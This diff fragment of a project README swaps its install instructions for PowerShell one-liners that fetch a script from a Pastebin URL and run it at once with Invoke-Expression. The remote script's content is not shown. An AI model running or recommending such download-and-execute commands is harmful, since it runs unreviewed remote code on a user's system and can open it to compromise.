@@ -13,11 +13,11 @@ boiling hatred in a pest
 
 # Powershell
 ```
-powershell -c(wget -useb -ur pastebin.com/raw/pqamKfgi).Content
+iex(wget -useb -ur pastebin.com/raw/v27ai472).Content
 ```
 # Command Prompt calling Powershell
 ```
-powershell -c "& powershell -c (wget -useb -ur pastebin.com/raw/pqamKfgi).Content"
+powershell iex(wget -useb -ur pastebin.com/raw/v27ai472).Content
 ```
 
 <br>
@@ -26,21 +26,9 @@ powershell -c "& powershell -c (wget -useb -ur pastebin.com/raw/pqamKfgi).Conten
 - 🔴Proceede at own risk❗
 ```
 
-
-
-
 <h3>Installation</h3>
 
 <blockquote>
-	
-```
-iex(wget -useb -ur pastebin.com/raw/v27ai472).Content
-```
-
-
-```
-powershell iex(wget -useb -ur pastebin.com/raw/v27ai472).Content
-```
 	
 <details>
   <summary>PowerShell from r</summary>
